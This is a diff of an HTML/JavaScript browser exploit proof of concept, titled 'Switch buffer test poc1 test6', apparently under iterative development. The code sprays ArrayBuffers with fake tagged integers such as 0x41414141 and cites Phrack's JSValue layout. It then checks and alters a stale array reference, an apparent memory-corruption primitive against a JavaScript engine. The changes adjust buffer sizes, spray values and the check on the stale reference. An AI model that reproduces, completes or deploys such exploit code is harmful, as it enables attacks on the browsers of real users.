@@ -9,7 +9,7 @@
         </style>
     </head>
     <body>
-        <h1>Switch buffer test poc1 test5</h1>
+        <h1>Switch buffer test poc1 test6</h1>
         <ul>
             <li><a href='javascript:go();'>go!</a></li>
             <li><a href='javascript:document.location.reload();'>reload</a></li>
@@ -65,7 +65,7 @@
                     // new array with 0x100 elements
                     var arr = new Array(0x100);
                     // new array buffer of length 0x1000
-                    var yolo = new ArrayBuffer(0x1024);
+                    var yolo = new ArrayBuffer(0x1000);
                     // populate the arr with pointer to yolo and a number. not quite sure why.
                     arr[0] = yolo;
                     arr[1] = 0x13371337;
@@ -92,7 +92,7 @@
                                 // which is the Integer 0x41414141
                                 // phrack: Integer FFFF:0000:IIII:IIII
                                 bufs[i][k++] = 0x41414141;
-                                bufs[i][k++] = 0xffffff00;
+                                bufs[i][k++] = 0xffff0000;
                             }
                         }
                         return 10;
@@ -123,7 +123,7 @@
                     stale = target.stale;
                     alert("test "+stale);
                     // make sure that the stale[0] points actually to the 0x41414141 data if not, we don't wanna mess with it and try again
-                    if(stale[0]==0x41414141) {
+                    if(stale[0]==0xffffffff) {
                         // stale[0] is now pointing at a fake Integer 0x41414141. Now make it 0x41414242
                         stale[0] += 0x101;
                         //stale[0] = 0x41414242;
